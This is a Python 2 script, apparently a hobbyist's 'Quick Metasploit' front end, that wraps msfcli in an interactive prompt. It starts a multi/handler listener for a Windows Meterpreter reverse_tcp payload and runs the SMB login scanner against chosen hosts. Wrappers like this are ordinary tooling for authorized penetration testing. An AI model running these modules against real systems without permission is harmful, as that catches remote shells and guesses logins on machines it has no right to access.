#!/usr/bin/python2.7
import cmd 
import subprocess
import sys
import time
import socket
import fcntl
import struct

from collections import defaultdict




################################################################Used for getting local ip address
def get_ip_address(ifname):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    return socket.inet_ntoa(fcntl.ioctl(
        s.fileno(),
        0x8915,  # SIOCGIFADDR
        struct.pack('256s', ifname[:15])
    )[20:24])
################################################################

default_variables = frozenset('iface module'.split())

module_variables = defaultdict(lambda : default_variables)
module_variables.update({module: default_variables | delta_variables for module, delta_variables in
    {'exploit/multi/handler': {'payload', 'lhost', 'lport'},
    'auxiliary/scanner/smb/smb_login': {'rhost', 'rport'}
    }.items()})


################################################################Main class for commands
class Handler(cmd.Cmd):

    lport = '4444'
    payload = 'windows/meterpreter/reverse_tcp'
    lhost = ''
    iface = 'eth0'
    module = 'exploit/multi/handler'
    rhosts = ''
    rport = ''

    possible_modules = ('exploit/multi/handler', 'auxiliary/scanner/smb/smb_login')
        
        
    def __init__(self):
        cmd.Cmd.__init__(self)
        self.lhost = get_ip_address(self.iface)
        self.variables = module_variables[self.module]
        

        
    def do_set(self, line):
        """Use Tab To Show Variables You Can Set"""
        try:
            var, val = line.split()
            if var == 'module':
                module = val
                self.variables = module_variables[module]
            setattr(self, var, val)
        
        except ValueError:
            print "=========================================="
            print "Please choose a option and a value to set!"
            print "=========================================="
            
    def complete_set(self, text, line, begidx, endidx):
        cmdtokens = line.split(' ')[:-1]
        if cmdtokens == ['set']:
            return [v for v in self.variables if v.startswith(text)]
        elif cmdtokens == ['set', 'module']:
            return [m for m in self.possible_modules if m.startswith(text)]
        else:
            return []
            
    def do_showpayloads(self, line):
        """Shows All The Avalible Payloads"""
        subprocess.call(["msfcli", "multi/handler", "P"])
        
    
    def do_showoptions(self, line):
        """Shows Options For Module"""
        self.lhost = get_ip_address(self.iface)
        if self.module == "exploit/multi/handler":
            print "========================================"
            print "--payload =", self.payload
            print "--lhost =", self.lhost
            print "--lport =", self.lport
            print "--module =", self.module
            print "========================================"
        elif self.module == "auxiliary/scanner/smb/smb_login":
            print "========================================"
            print "--rhosts =", self.rhosts
            print "--rport =", self.rport
            print "--module =", self.module
            print "========================================"
        else:
            print "The module (%s) isn't supported yet!" % self.module
        
    def do_run(self, line):
        """Runs The Module With Settings"""
        if self.module == "exploit/multi/handler":
            subprocess.call(["msfcli", self.module, "payload=%s" %self.payload, "lhost=%s" %self.lhost, "lport=%s" %self.lport, "E"])
            
        elif self.module == "auxiliary/scanner/smb/smb_login":
            subprocess.call(["msfcli", self.module, "rhosts=%s" %self.rhosts, "rport=%s" %self.rport, "E"])
            
################################################################




################################################################ Used for import into modules
if __name__ == '__main__':
    print "========================================"
    print "-- Quick Metasploit"
    print "-- Type Help To List All Commands"
    print "-- Type Help (Command) For Specific Help"
    print "-- Local Ip Will Be Automaticaly Set"
    print "-- CTRL + C To Exit"
    print "========================================"
################################################################




################################################################ Catches Ctrl C and asks user for confirmation
    while(True):
        try:
            prompt = Handler()
            prompt.prompt = '(>>)'
            prompt.cmdloop('')
        except (KeyboardInterrupt, SystemExit):
            while(True):
                try:
                    time.sleep(0.05)
                    exit = raw_input ("\n\nAre You Sure You Want To Quit? y/n (>>)")
                    if exit.lower()[0] == "y":
                        print "Exiting..."
                        sys.exit()
                    else:
                        prompt.cmdloop('')
                
                except KeyboardInterrupt:
                    pass
#################################################################
